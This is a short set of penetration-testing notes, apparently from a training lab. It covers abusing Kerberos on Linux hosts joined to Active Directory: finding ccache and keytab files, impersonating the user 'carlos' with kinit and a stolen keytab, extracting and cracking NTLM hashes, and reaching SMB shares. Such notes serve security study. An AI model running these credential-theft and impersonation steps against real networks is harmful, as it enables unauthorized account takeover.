A Linux computer connected to Active Directory commonly uses Kerberos as authentication.
It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.


PRIV-ESC QUICKY:
sudo su


WHERE TO FIND TICKEETS:
/tmp (as ccache files)
environment variable KRB5CCNAME


FINDING CCACHE FILES:
env | grep -i krb5
(the files will have krb5cc in the name)


LINUX AUTH VIA PORT FORWARD
ssh <username>@<domain-name>@<target-ip> -p <target-port>



TO IDENTIFY IF A LINUX MACHINE IS DOMAIN-JOINED (like for Kerberos):
on target:
realm list
or:
ps -ef | grep -i "winbind\|sssd"


KEYTAB FILES:
allows scripts to authenticate automatically using Kerberos w/o human interaction

Finding keytab w/ FIND:
find / -name *keytab* -ls 2>/dev/null
or in cronjobs:
crontab -l
(look for 'kinit'; it means Kerberos is in use)





ABUSING KEYTAB FILES:
klist -k -t /opt/specialfiles/carlos.keytab 

Impersonating User w/ keytabs:
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

Attempt to connect to SMB share as carlos:
smbclient //dc01/carlos -k -c ls




EXTRACTING SECRETS FROM KEYTAB FILES:
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
(this should probide a ntlm hash for the user)

You can crack the ntlm hash via crackstation, hashcat, or john

To check group memberships (priv checkingg):
